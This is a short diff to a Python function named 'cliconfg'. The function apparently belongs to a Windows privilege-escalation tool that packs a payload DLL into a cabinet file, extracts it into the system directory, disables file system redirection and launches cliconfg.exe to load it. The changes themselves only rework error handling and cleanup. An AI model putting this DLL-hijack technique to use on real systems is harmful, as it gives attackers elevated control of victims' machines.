@@ -73,12 +73,16 @@ def cliconfg(payload):
 				print_success("Successfully created cabinet file")
 			else:
 				print_error("Unable to create cabinet file")
-				if "error" in Constant.output:
-					cliconfg_cleanup()
+				for x in Constant.output:
+					if "error" in x:
+						cliconfg_cleanup(path)
+						return False
 		else:
 			print_error("Unable to create cabinet file, dll file is not found")
-			if "error" in Constant.output:
-				cliconfg_cleanup()
+			for x in Constant.output:
+				if "error" in x:
+					cliconfg_cleanup(path)
+					return False
 
 		time.sleep(5)
 
@@ -89,12 +93,16 @@ def cliconfg(payload):
 				print_success("Successfully extracted cabinet file")
 			else:
 				print_error("Unable to extract cabinet file")	
-				if "error" in Constant.output:
-					cliconfg_cleanup()
+				for x in Constant.output:
+					if "error" in x:
+						cliconfg_cleanup(path)
+						return False
 		else:
 			print_error("Unable to extract cabinet file, cabinet file is not found")
-			if "error" in Constant.output:
-				cliconfg_cleanup()
+			for x in Constant.output:
+				if "error" in x:
+					cliconfg_cleanup(path)
+					return False
 
 		time.sleep(5)
 
@@ -103,12 +111,15 @@ def cliconfg(payload):
 			print_success("Successfully disabled file system redirection")
 			if process().create(os.path.join(information().system_directory(), "cliconfg.exe")):
 				print_success("Successfully executed cliconfg executable")
+				time.sleep(5)
 				if cliconfg_cleanup():
 					print_success("All done!")
 			else:
 				print_error("Unable to execute cliconfg executable")
-				if "error" in Constant.output:
-					cliconfg_cleanup()
+				for x in Constant.output:
+					if "error" in x:
+						cliconfg_cleanup(path)
+						return False
 	else:
 		print_error("Cannot proceed, invalid payload")
 		return False
